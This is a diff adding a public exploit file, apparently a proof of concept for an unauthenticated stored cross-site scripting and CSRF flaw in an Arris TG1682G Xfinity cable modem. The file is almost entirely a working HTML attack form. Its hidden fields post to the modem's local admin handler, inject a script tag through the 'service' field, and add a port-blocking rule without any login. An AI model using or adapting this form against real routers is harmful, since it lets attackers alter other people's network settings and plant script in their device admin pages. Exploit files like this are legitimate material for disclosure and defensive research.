@@ -1,0 +1,26 @@
+<!--
+# Exploit Title: Unauthenticated Stored Xss
+# Date: 11/6/15
+# Exploit Author: Nu11By73
+# Vendor Homepage: comcast.net and arrisi.com
+# Version:  eMTA & DOCSIS Software Version: 10.0.59.SIP.PC20.CT
+Software Image Name:TG1682_2.0s7_PRODse
+Advanced Services:TG1682G
+Packet Cable:2.0
+# Tested on: Default Install
+-->
+
+<html>
+<p>Unauth Stored CSRF/XSS - Xfinity Modem</p>
+<form method="POST" action="http://192.168.0.1/actionHandler/ajax_managed_services.php">
+<input type="hidden" name="set" value="true" />
+<input type="hidden" name="UMSStatus" value="Enabled" />
+<input type="hidden" name="add" value="true" />
+<input type="hidden" name="service" value="test><script>alert(1)</script>" / >
+<input type="hidden" name="protocol" value="TCP" / >
+<input type="hidden" name="startPort" value="1" />
+<input type="hidden" name="endPort" value="2" />
+<input type="hidden" name="block" value="true" />
+<input type="submit" title="Enable Service" />
+</form>
+</html>
